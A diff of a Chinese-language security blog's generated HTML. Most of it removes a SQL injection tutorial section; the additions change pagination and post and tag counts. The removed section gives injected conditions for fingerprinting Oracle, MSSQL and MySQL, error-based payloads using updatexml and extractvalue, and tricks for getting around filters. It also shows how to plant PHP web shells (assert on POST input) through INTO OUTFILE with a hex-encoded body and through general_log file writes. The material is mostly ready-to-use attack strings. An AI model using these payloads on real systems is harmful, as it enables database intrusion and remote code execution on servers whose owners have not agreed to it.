-<h3 id="2-通过各个数据库特有的数据表和环境变量来判断"><a href="#2-通过各个数据库特有的数据表和环境变量来判断" class="headerlink" title="2. 通过各个数据库特有的数据表和环境变量来判断"></a>2. 通过各个数据库特有的数据表和环境变量来判断</h3><ul>
-<li><p>Oracle:</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></li>
-<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1056134">Mssql </a></p>
-<ul>
-<li>特有的系统表</li>
-</ul>
-<p>  sysdatabases: 存储了所有的数据库，sysobjects存储了所有的数据库表。<code>select * from master.dbo.sysdatabases</code>就可以查询出所有的库名。 </p>
-<p>  Sysobjects：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from )&gt;0 and 1=1</span><br></pre></td></tr></table></figure>
-<p>  syscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。主要字段有：</p>
-<ul>
-<li>系统变量</li>
-</ul>
-<p>  SQL－SERVER有user,db_name(),@@VERSION等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。(无version()函数)</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc.asp?p=YY and user&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名</span><br><span class="line"></span><br><span class="line">abc.asp?p=YY&amp;n ... db_name()&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；</span><br></pre></td></tr></table></figure></li>
-<li><p>Mysql:</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(*) from information_schema.TABLES)&gt;0 and 1=1--+</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="3-通过各数据库特有的连接符判断数据库类型"><a href="#3-通过各数据库特有的连接符判断数据库类型" class="headerlink" title="3. 通过各数据库特有的连接符判断数据库类型"></a>3. 通过各数据库特有的连接符判断数据库类型</h3><ol>
-<li><p>mssql数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p>mysql数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;2&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p>oracle数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="0x03-注入位置"><a href="#0x03-注入位置" class="headerlink" title="0x03 注入位置"></a>0x03 注入位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id=[子查询] order by [子查询, PROCEDURE ANALYSE] limit [PROCEDURE ANALYSE, INTO...LINES TERMINATED BY]</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-limit注入"><a href="#1-limit注入" class="headerlink" title="1. limit注入"></a>1. limit注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;SELECT id FROM test WHERE id &gt; 0 ORDER BY id LIMIT &quot;.$_GET[&#x27;num&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p>limit注入分有无<code>order by</code>. 若无<code>order by</code>可以使用union select，存在<code>order by</code>可以使用<code>procedure analyse()</code>报错注入和<code>into outfile &#39;&#39; lines terminated by</code>写文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1 into outfile &#x27;D:\\phpstudy_pro\\WWW\\test123.php&#x27; LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>procedure analysis此方法只适用于小于5.6.6的5.x系列。into 需要有file权限</p>
-</blockquote>
-<h3 id="2-order-by注入"><a href="#2-order-by注入" class="headerlink" title="2. order by注入"></a>2. order by注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;select * from test order by &quot;.$_GET[&#x27;order&#x27;];</span><br></pre></td></tr></table></figure>
-<p>order by后可直接跟子查询</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order=updatexml(1,concat(0x3a,user(),0x3a),1)</span><br><span class="line">order=updatexml(1,concat(0x3a,(select id from test limit 1),0x3a),1)</span><br><span class="line">extractvalue(1,concat(0x3a,user(),0x3a))</span><br></pre></td></tr></table></figure>
-<h3 id="3-表名注入"><a href="#3-表名注入" class="headerlink" title="3. 表名注入"></a>3. 表名注入</h3><p><code>show columns from $table</code>show的语法如下。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">[LIKE &#x27;pattern&#x27; | WHERE expr]</span><br></pre></td></tr></table></figure>
-<p>后面可以直接跟where子查询：<code>SHOW COLUMNS FROM </code>test<code> WHERE UPDATEXML(1,user(),1);</code></p>
-<p>还有<code>describe $table</code>, <code>update $table</code>等。</p>
-<h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="1-替换逗号"><a href="#1-替换逗号" class="headerlink" title="1. 替换逗号"></a>1. 替换逗号</h3><ol>
-<li><p>substring from…for</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,2)) -&gt; select ascii(substring(user() from 1 for 1))</span><br></pre></td></tr></table></figure></li>
-<li><p><code>like &#39;a%&#39;</code> 成功再测试 <code>like &#39;aa%&#39;</code>、 <code>like &#39;ab%&#39;</code> … <code>like &#39;az%&#39;</code> 直到第二个字符正确，再测试第三个。</p>
-</li>
-<li><p><code>select user() regexp &#39;^a&#39;</code></p>
-</li>
-</ol>
-<h3 id="2-符号替换"><a href="#2-符号替换" class="headerlink" title="2. 符号替换"></a>2. 符号替换</h3><p><img src="./sql_waf_bypass.jpg" alt="image"></p>
-<h3 id="3-sqlmap-tamper"><a href="#3-sqlmap-tamper" class="headerlink" title="3. sqlmap tamper"></a>3. sqlmap tamper</h3><blockquote>
-<p>过waf tamper相关<br><br>与burp联合，sqlmap4burp，gason，sqlipy</p>
-</blockquote>
-<h2 id="0x05-getshell"><a href="#0x05-getshell" class="headerlink" title="0x05 getshell"></a>0x05 getshell</h2><h3 id="1-注入写shell"><a href="#1-注入写shell" class="headerlink" title="1. 注入写shell"></a>1. 注入写shell</h3><p>mysql的secure_file_priv参数限制了的导入导出的文件权限，只能将文件导入或导出到指定位置（一般不能导出到web目录）。</p>
-<p>这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。</p>
-<blockquote>
-<p>show variables like ‘%secure%’. 其中当参数 secure_file_priv 为空时，对导入导出无限制<br><br>当值为一个指定的目录时，只能向指定的目录导入导出<br><br>当值被设置为NULL时，禁止导入导出功能</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;&lt;?phpinfo();?&gt;&#x27; into dumpfile &#x27;D:\\test.php&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">注入payload：</span><br><span class="line">id=1&#x27; union select 1,&#x27;123&#x27; into dumpfile &#x27;D:/xxx/xxx/shell.php&#x27;-- -</span><br></pre></td></tr></table></figure>
-<ul>
-<li>dumpfile/outfile/load_file区别参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zztac/p/11371149.html">dumpfile/outfile/load_file</a></li>
-</ul>
-<h3 id="2-日志写shell"><a href="#2-日志写shell" class="headerlink" title="2. 日志写shell"></a>2. 日志写shell</h3><p>general_log</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line">SET global general_log_file=&#x27;E:/UPUPW_AP5.6-1510/UPUPW_AP5.6/htdocs/classes.php&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
+
 
 
           </div>
@@ -2150,7 +2243,7 @@ curl直接发起gopher攻击：
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2172,7 +2265,7 @@ curl直接发起gopher攻击：
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
